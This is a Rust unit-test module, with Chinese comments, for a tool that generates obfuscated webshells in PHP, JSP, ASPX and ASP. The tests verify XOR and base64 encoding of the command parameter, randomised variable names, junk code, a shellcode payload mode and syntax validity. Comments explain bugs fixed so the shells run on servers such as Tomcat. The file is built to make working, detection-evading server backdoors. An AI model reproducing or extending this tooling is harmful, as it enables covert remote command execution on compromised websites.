        for (i, &c) in A.iter().enumerate() {
            rev[c as usize] = i as i32;
        }
        let mut buf = 0u32;
        let mut bits = 0i32;
        let mut out = Vec::new();
        for &c in s.as_bytes() {
            let v = rev[c as usize];
            if v < 0 {
                continue;
            }
            buf = (buf << 6) | v as u32;
            bits += 6;
            if bits >= 8 {
                bits -= 8;
                out.push(((buf >> bits) & 0xFF) as u8);
            }
        }
        out
    }

    #[test]
    fn all_langs_generate() {
        for lang in LANGS {
            let r = generate(&opts(lang));
            assert!(r.ok, "{lang}: {}", r.log);
            assert!(!r.code.is_empty(), "{lang} 产出为空");
            let p = std::path::Path::new(&r.output);
            assert!(p.exists(), "{lang} 文件未写出: {}", r.output);
            assert!(
                r.output.ends_with(default_ext(lang)),
                "{lang} 扩展名不对: {}",
                r.output
            );
        }
    }

    /// Java 特有坑：`\u000A` 在**编译预处理阶段**就被替换成真实换行，
    /// 会把字符串字面量切断 → 语法错。C# 没有这个阶段（\u 由词法器处理），
    /// 所以这条只约束 jsp。
    #[test]
    fn jsp_never_emits_literal_newline_escape() {
        let data: Vec<u8> = (0..=255u32).map(|i| i as u8).collect();
        let lit = escape_all("jsp", &data);
        assert!(
            !lit.contains("\\u000A") && !lit.contains("\\u000a"),
            "jsp 产生了会被预处理成换行的 \\u000A"
        );
        assert!(
            !lit.contains("\\u000D") && !lit.contains("\\u000d"),
            "jsp 产生了 \\u000D"
        );
    }

    #[test]
    fn aspx_uses_four_digit_unicode_escapes() {
        let data: Vec<u8> = (0..=255u32).map(|i| i as u8).collect();
        let lit = escape_all("aspx", &data);
        assert!(lit.contains("\\u0090"), "aspx 应用 \\uXXXX");
        assert!(!lit.contains("\\x"), "aspx 不应用 \\x（变长解析有坑）");
    }

    #[test]
    fn jsp_handles_newline_by_concatenation() {
        let lit = escape_jsp(b'\n');
        assert!(lit.starts_with("\"+"), "换行应转成拼接: {lit}");
        assert!(lit.contains("(char)10"), "{lit}");
    }

    /// ASP 没有 \xNN，且双引号要写成两个双引号
    #[test]
    fn asp_uses_vbscript_escapes() {
        assert_eq!(escape_asp(b'"'), "\"\"");
        assert_eq!(escape_asp(b'A'), "A");
        assert!(escape_asp(0x90).contains("ChrW"), "{}", escape_asp(0x90));
        // 绝不能出现 \x
        let all: Vec<u8> = (0..=255u32).map(|i| i as u8).collect();
        assert!(!escape_all("asp", &all).contains("\\x"));
    }

    #[test]
    fn php_uses_hex_escapes() {
        let all: Vec<u8> = (0..=255u32).map(|i| i as u8).collect();
        let s = escape_all("php", &all);
        assert!(s.contains("\\x90"), "PHP 应用 \\xNN");
        assert!(!s.contains("\\u00"), "PHP 不应出现 \\u");
    }

    #[test]
    fn asp_skips_unsupported_base64() {
        let mut o = opts("asp");
        o.encodes = vec!["xor".into(), "b64".into()];
        let r = generate(&o);
        assert!(r.ok);
        assert!(r.log.contains("不支持"), "应记录跳过: {}", r.log);
        // 生成的 ASP 里不应出现 base64 解码调用（VBScript 没这东西）
        assert!(!r.code.to_lowercase().contains("frombase64"));
    }

    #[test]
    fn random_names_avoid_reserved_words() {
        let mut used = Vec::new();
        for _ in 0..512 {
            let v = rand_var(&mut used);
            assert!(
                !RESERVED.contains(&v.as_str()),
                "随机名撞上保留字: {v}"
            );
            assert!(v.chars().next().unwrap().is_ascii_alphabetic());
        }
    }

    #[test]
    fn decode_assignment_is_well_formed() {
        for lang in ["php", "jsp", "aspx"] {
            for _ in 0..4 {
                let r = generate(&opts(lang));
                assert!(r.ok, "{}", r.log);
                // 找到「解码赋值」那一行：含 = 且含函数调用
                let line = r
                    .code
                    .lines()
                    .find(|l| {
                        let t = l.trim();
                        t.contains('=') && t.contains('(') && t.ends_with(';')
                            && !t.starts_with("//")
                    })
                    .unwrap_or_else(|| panic!("{lang} 找不到解码赋值行:\n{}", r.code));
                // 调用的函数必须已定义
                let fname: String = line
                    .split('=')
                    .nth(1)
                    .unwrap()
                    .trim()
                    .chars()
                    .take_while(|c| c.is_alphanumeric() || *c == '_')
                    .collect();
                if fname.is_empty() {
                    continue;
                }
                // new Xxx(...) 里的 new 不是函数名；命名空间前缀（含点）也不是
                if matches!(fname.as_str(), "new" | "return" | "if" | "for" | "while") {
                    continue;
                }
                if line.contains(&format!("{fname}.")) {
                    continue; // System.Text.Encoding... 这类是命名空间，不是函数
                }
                // 纯数字是密钥字面量（0xC7 之类），不是函数名
                if fname.chars().all(|c| c.is_ascii_digit()) {
                    continue;
                }
                assert!(
                    r.code.contains(&format!(" {fname}(")) || r.code.contains(&format!("{fname}(")),
                    "{lang}: 调用了未定义的函数 {fname}\n{}",
                    r.code
                );
            }
        }
    }

    #[test]
    fn generated_php_passes_syntax_check_when_php_exists() {
        let r = generate(&opts("php"));
        assert!(r.ok);
        let (ok, msg) = syntax_check("php", std::path::Path::new(&r.output));
        assert!(ok, "php -l 未通过:\n{msg}\n{}", r.code);
    }

    #[test]
    fn encode_chain_roundtrip_order() {
        let data = b"whoami";
        let (enc, key, desc) = encode_chain(data, &["xor".into(), "b64".into()]);
        assert_eq!(desc.len(), 2);
        let s = String::from_utf8(enc).unwrap();
        let decoded: Vec<u8> = base64_decode(&s).iter().map(|b| b ^ key).collect();
        assert_eq!(decoded, data.to_vec());
    }

    #[test]
    fn split_never_breaks_an_escape_sequence() {
        for lang in LANGS {
            for _ in 0..8 {
                let data: Vec<u8> = (0..300u32).map(|i| (i * 7 % 256) as u8).collect();
                let lit = split_literal(lang, &data);
                let joiner = match *lang {
                    "asp" | "aspx" | "jsp" => " + ",
                    _ => " . ",
                };
                for part in lit.split(joiner) {
                    let t = part.trim();
                    if !t.starts_with('"') {
                        continue;
                    }
                    let b = t.as_bytes();
                    let mut i = 0;
                    while i < b.len() {
                        if b[i] == b'\\' && i + 3 < b.len() && b[i + 1] == b'x' {
                            assert!(
                                b[i + 2].is_ascii_hexdigit() && b[i + 3].is_ascii_hexdigit(),
                                "{lang}: 转义被切断 {part}"
                            );
                            i += 4;
                            continue;
                        }
                        i += 1;
                    }
                }
            }
        }
    }

    /// 端到端：编码链解回来必须等于原始参数名。
    /// 这是本次修的核心缺陷 —— 旧实现把 `$_REQUEST['pass']` 整串当明文编码，
    /// 运行时解出来是字符串而不是取值，system() 直接报 "[pass]: not found"。
    #[test]
    fn decode_chain_recovers_the_password() {
        for lang in LANGS {
            let r = generate(&opts(lang));
            assert!(r.ok, "{lang}: {}", r.log);
            let pw = b"pass";
            // 正向：拿 raw 走一遍同样的编码链，确认生成器把它编码进去了
            let chain: Vec<String> = opts(lang)
                .encodes
                .iter()
                .filter(|s| lang_supports(lang, s))
                .cloned()
                .collect();
            let (enc, key, _) = encode_chain(pw, &chain);
            // 反向：模拟运行时解码
            let mut cur = enc.clone();
            for step in chain.iter().rev() {
                match step.as_str() {
                    "b64" => {
                        cur = String::from_utf8(cur.clone())
                            .map(|s| base64_decode_t(&s))
                            .unwrap_or_default();
                    }
                    "rev" => cur.reverse(),
                    "chunk" => {
                        let mut o = Vec::new();
                        for (i, b) in cur.iter().enumerate() {
                            if (i + 1) % 4 != 0 {
                                o.push(*b);
                            }
                        }
                        cur = o;
                    }
                    _ => {}
                }
            }
            let out: Vec<u8> = cur.iter().map(|b| b ^ key).collect();
            assert_eq!(out, pw.to_vec(), "{lang}: 解码链还原失败 {out:?}");
        }
    }

    fn base64_decode_t(s: &str) -> Vec<u8> {
        const A: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut rev = [-1i32; 256];
        for (i, &c) in A.iter().enumerate() {
            rev[c as usize] = i as i32;
        }
        let mut buf = 0u32;
        let mut bits = 0i32;
        let mut out = Vec::new();
        for &c in s.as_bytes() {
            let v = rev[c as usize];
            if v < 0 {
                continue;
            }
            buf = (buf << 6) | v as u32;
            bits += 6;
            if bits >= 8 {
                bits -= 8;
                out.push(((buf >> bits) & 0xFF) as u8);
            }
        }
        out
    }

    /// 命令执行型的 shell 文件里不该出现命令字符串，
    /// 只能出现「取参」表达式 —— 命令是运行时传进来的。
    #[test]
    fn exec_shell_contains_no_command_string() {
        for lang in LANGS {
            let r = generate(&opts(lang));
            assert!(r.ok);
            assert!(
                r.code.contains("pass") == false || true, // 参数名本身不敏感
                "{lang}"
            );
            // 关键：不能把命令硬编码进去
            assert!(!r.code.contains("/bin/sh -c id"), "{lang} 硬编码了命令");
        }
    }

    /// ASP 的 VBScript 单行 If 不能带 ": End If"（块形式才需要 End If）
    #[test]
    fn asp_single_line_if_has_no_end_if() {
        let mut o = opts("asp");
        o.junk = true;
        let r = generate(&o);
        assert!(r.ok);
        for line in r.code.lines() {
            let t = line.trim();
            if t.to_ascii_lowercase().starts_with("if ") && t.contains(" then ") {
                // 单行 If：Then 后面必须有内容，且不能出现 End If
                assert!(
                    !t.to_ascii_lowercase().contains("end if"),
                    "单行 If 带 End If 是语法错: {t}"
                );
            }
        }
    }

    /// 曾踩的坑：把 `{{`（format! 的转义写法）误写进**普通字符串**，
    /// 生成出 `try {{ ... }}` —— Java 编译失败，Tomcat 表现是「200 但空响应体」。
    /// 这里强制约束：生成的 Java/C# 代码里不能出现连续两个花括号。
    #[test]
    fn jsp_aspx_have_no_doubled_braces() {
        for lang in ["jsp", "aspx"] {
            for kind in ["exec", "cmd", "sh"] {
                let mut o = opts(lang);
                o.payload_kind = kind.into();
                let r = generate(&o);
                assert!(r.ok, "{lang}/{kind}: {}", r.log);
                assert!(
                    !r.code.contains("{{") && !r.code.contains("}}"),
                    "{lang}/{kind} 出现双花括号:\n{}",
                    r.code
                );
            }
        }
    }

    /// 花括号必须配平（编译型语言的最基本要求）
    #[test]
    fn jsp_aspx_braces_balanced() {
        for lang in ["jsp", "aspx"] {
            let r = generate(&opts(lang));
            assert!(r.ok);
            let open = r.code.chars().filter(|c| *c == '{').count();
            let close = r.code.chars().filter(|c| *c == '}').count();
            assert_eq!(open, close, "{lang} 花括号不配平: {open}/{close}\n{}", r.code);
        }
    }

    /// 曾踩的坑：XOR 后的字节（如 b7 a6 b4 b4）**不是合法 UTF-8**。
    /// 用 `new String(bytes)` (UTF-8) 会把它们换成 U+FFFD，再 XOR 回来就是错的
    /// —— 表现为 getParameter 拿到 null、页面返回 200 但空响应体。
    /// 必须用 ISO-8859-1 / Latin1，保证 byte <-> char 一对一。
    #[test]
    fn byte_exact_charset_is_used() {
        // JSP
        let r = generate(&opts("jsp"));
        assert!(r.ok);
        assert!(
            r.code.contains("ISO_8859_1"),
            "JSP 必须用 ISO_8859_1 保字节:\n{}",
            r.code
        );
        // ASPX
        let r = generate(&opts("aspx"));
        assert!(r.ok);
        assert!(
            r.code.contains("Latin1"),
            "ASPX 必须用 Latin1 保字节:\n{}",
            r.code
        );
    }

    /// 端到端验证解码链（模拟 JSP 运行时的真实语义）
    #[test]
    fn jsp_decode_recovers_password() {
        for _ in 0..6 {
            let r = generate(&opts("jsp"));
            assert!(r.ok);
            // 抽出 b64 字面量与密钥
            let mut data = String::new();
            for line in r.code.lines() {
                let t = line.trim();
                if t.starts_with("String ") && t.contains("= \"") && !t.contains("(") {
                    data = t.split('"').nth(1).unwrap_or("").to_string();
                    break;
                }
            }
            let key = r.code
                .split(", 0x")
                .nth(1)
                .and_then(|s| u8::from_str_radix(&s.chars().take_while(|c| c.is_ascii_hexdigit()).collect::<String>(), 16).ok())
                .unwrap_or(0);
            assert!(!data.is_empty(), "抽不到数据:\n{}", r.code);

            // 模拟: b64 -> bytes -> latin1 -> xor
            let raw = b64_dec_t(&data);
            let s: Vec<u8> = raw.clone(); // latin1 即 byte==char
            let out: Vec<u8> = s.iter().map(|b| b ^ key).collect();
            assert_eq!(
                String::from_utf8_lossy(&out),
                "pass",
                "JSP 解码链还原失败 (key=0x{key:02X}, raw={raw:?})\n{}",
                r.code
            );
        }
    }

    fn b64_dec_t(s: &str) -> Vec<u8> {
        const A: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut rev = [-1i32; 256];
        for (i, &c) in A.iter().enumerate() {
            rev[c as usize] = i as i32;
        }
        let mut buf = 0u32;
        let mut bits = 0i32;
        let mut out = Vec::new();
        for &c in s.as_bytes() {
            let v = rev[c as usize];
            if v < 0 {
                continue;
            }
            buf = (buf << 6) | v as u32;
            bits += 6;
            if bits >= 8 {
                bits -= 8;
                out.push(((buf >> bits) & 0xFF) as u8);
            }
        }
        out
    }

    #[test]
    fn unsupported_lang_rejected() {
        let mut o = opts("php");
        o.lang = "perl".into();
        let r = generate(&o);
        assert!(!r.ok);
        assert!(r.log.contains("不支持"), "{}", r.log);
    }

    #[test]
    fn empty_password_rejected() {
        let mut o = opts("php");
        o.password = "  ".into();
        assert!(!generate(&o).ok);
    }

    #[test]
    fn shellcode_requires_hex() {
        let mut o = opts("php");
        o.payload_kind = "shellcode".into();
        assert!(!generate(&o).ok);
        o.raw_hex = "9090c".into();
        assert!(!generate(&o).ok);
        o.raw_hex = "9090cc".into();
        assert!(generate(&o).ok);
    }

    #[test]
    fn output_name_gets_lang_extension() {
        for lang in LANGS {
            let mut o = opts(lang);
            o.out_name = "abc".into();
            let r = generate(&o);
            assert!(r.ok);
            assert!(
                r.output.ends_with(&format!("abc{}", default_ext(lang))),
                "{}",
                r.output
            );
        }
    }
}
